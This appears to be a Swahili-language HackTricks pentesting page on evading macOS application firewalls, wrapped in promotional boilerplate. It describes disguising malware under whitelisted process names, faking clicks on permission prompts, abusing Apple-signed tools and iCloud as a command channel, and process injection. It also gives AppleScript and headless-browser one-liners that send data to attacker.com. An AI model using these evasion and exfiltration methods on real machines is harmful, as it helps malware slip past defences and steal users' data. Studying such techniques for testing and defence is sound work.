# Kupitisha Firewalls ya macOS

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Mbinu Zilizopatikana

Mbinu zifuatazo zilipatikana zikifanya kazi kwenye baadhi ya programu za firewall za macOS.

### Kutumia majina ya orodha nyeupe vibaya

* Kwa mfano kuita zisizo na programu hasidi majina ya michakato inayojulikana vizuri ya macOS kama vile **`launchd`**

### Bonyeza ya Kisynthetic

* Ikiwa firewall inauliza idhini kwa mtumiaji, fanya zisizo na programu hasidi **bonyeza kwenye ruhusu**

### **Tumia programu zilizosainiwa na Apple**

* Kama vile **`curl`**, lakini pia nyingine kama **`whois`**

### Vipeni vya Apple vilivyofahamika

Firewall inaweza kuruhusu uhusiano kwenye vikoa vya Apple vilivyofahamika kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.

### Kupitisha Kwa Ujumla

Mawazo kadhaa kujaribu kupitisha firewalls

### Angalia trafiki iliyoruhusiwa

Kujua trafiki iliyoruhusiwa kutakusaidia kutambua vikoa vilivyowekwa kwenye orodha nyeupe au ni programu zipi zilizoruhusiwa kufikia vikoa hivyo.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Kutumia DNS

Ufumbuzi wa DNS unafanywa kupitia programu iliyosainiwa ya **`mdnsreponder`** ambayo labda itaruhusiwa kuwasiliana na seva za DNS.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Kupitia Programu za Kivinjari

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia sindano za michakato

Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote unaweza kudukua kinga ya firewall:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Marejeo

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
